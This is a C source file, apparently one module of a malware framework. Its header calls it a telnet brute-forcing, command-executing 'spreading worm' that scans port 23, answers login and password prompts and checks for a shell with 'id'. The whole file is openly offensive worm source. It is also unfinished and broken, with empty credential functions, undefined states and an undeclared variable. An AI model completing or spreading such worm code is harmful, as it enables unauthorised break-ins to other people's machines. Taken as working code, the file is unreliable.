/*
telnet brute forcing, and command execution (spreading worm)

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include "../../list.h"
#include "../../structs.h"
#include "../../utils.h"
#include "telnet.h"


int telnet_init(Modules **);

ModuleFuncs telnet_funcs = { 
    &telnet_read,
    &telnet_write,
    &telnet_incoming,
    &telnet_outgoing,
    &telnet_nodes,
    &telnet_main_loop,
    NULL
};

Modules HACK_Telnet = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    23, 0,
    // required 0, 0..  
    0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    // we will run this every 5 seconds since we are a WORM
    5,
    // telnet functions
    &telnet_funcs, NULL,
    // no magic bytes for telnet
    NULL, 0
};


// initialize the module
int telnet_init(Modules **_module_list) {
    Module_Add(_module_list, &HACK_Telnet);
}

enum {
    STATE_TELNET_NEW,
    STATE_TELNET_LOGIN,
    STATE_TELNET_PASSWORD,
    STATE_TELNET_INSIDE,
    STATE_TELNET_LOGIN_VERIFY,
};

struct _telnet_searchable_strings {
    char *string;
    int state;
} TelnetSearchableString[] = {
    { "ogin:", STATE_TELNET_LOGIN },
    { "assword:", STATE_LOGIN_PASSWORD },
    { NULL, 0 }
};

int telnet_read(Modules *mptr, Connection *cptr, char **_buf, int *_size) {
    int i = 0;
    
    // read till \r\n
    for (i = 0; TelnetSearchableString[i].string != NULL; i++) {
        if (strcasestr(buf, TelnetSearchableString[i].string) != NULL) {
            cptr->state = TelnetSearchableString[i].state;
        }
        
    }
    
    return 0;
}

int telnet_write(Modules *mptr, Connection *cptr, char **_buf, int *_size) {
    return 0;
}

typedef char *(*ExpectCMD)(Modules *, Connection *, int *size);

char *BuildLogin(Modules *mptr, Connection *cptr, int *size) {
    
}


char *BuildPassword(Modules *mptr, Connection *cptr, int *size) {
    
}

char *BuildVerify(Modules *mptr, Connection *cptr, int *size) {
    char *ret = malloc(16);
    
    if (ret == NULL) return ret;
    
    memset(ret, 0, 16);
    strcpy(ret, "id;\r\n");
    
    *size = strlen(ret);
    return ret;
}

// every state has a command we want to write, what we expect to see, and then the new state if its found
// and a module to move the command to if we need to (for privilege escalation, etc)
typedef struct _state_commands {
    int state;
    char *expect;
    ExpectCMD BuildData;
    int new_state;
    struct _modules *next_module;
} StateCommands[] = {
    { STATE_TELNET_NEW, "ogin:", &BuildLogin, STATE_TELNET_PASSWORD, NULL },
    { STATE_TELNET_PASSWORD, "assword:", &BuildLogin, STATE_TELNET_FINDSHELL, NULL },
    { STATE_TELNET_FINDSHELL, "last login", NULL, STATE_TELNET_INSIDE, NULL },
    { STATE_TELNET_INSIDE, "uid", &BuildVerify, STATE_TELNET_VERIFY, NULL },
    { 0, NULL, NULL, 0, NULL }
};

int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    int ret = 0;
    int i = 0;
    char *recv_line = NULL;
    int line_size = 0;
    
    for (i = 0; StateCommands[i].expect != NULL; i++) {
        if (StateCommands[i].state == cptr->state) {
            ret = 1;
            
            // retrieve 1 single line from the incoming queue
            recv_line = QueueParseAscii(cptr->incoming, &line_size);
            if (recv_line) {
                // verify what we expect is in the line..
                if (strcasestr(recv_line, StateCommands[i].expect) != NULL) {
                    int dsize = 0;
                    char *data = StateCommands[i].BuildData(mptr, cptr, &dsize);
                    if (data == NULL) {
                        // set as bad..
                        ret = 0;
                        // connection bad happens at end of func because ret wont be 1
                        //ConnectionBad(cptr);
                        break;
                    }
                    
                    // queue outgoing data..
                    QueueAdd(mptr, cptr, data, dsize);
                    ret = 1;
                }
                // free the line.. no more use for it
                free(recv_line);
            }
            break;
        }
    }
    
    if (ret != 1)
        ConnectionBad(cptr);
    
    return ret;
}

int telnet_outgoing(Modules *mptr, Connection *cptr, char *buf, int size) {
    return size;
}

int telnet_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int telnet_nodes(Modules *mptr, Connection *cptr, char *buf, int size) {
    // this has to communicate with port scanner to obtain ip addresses of open telnet ports
    
}

int telnet_connect(Modules *mptr, Connection **_conn_list, uint32_t ip, int port) {
    
}
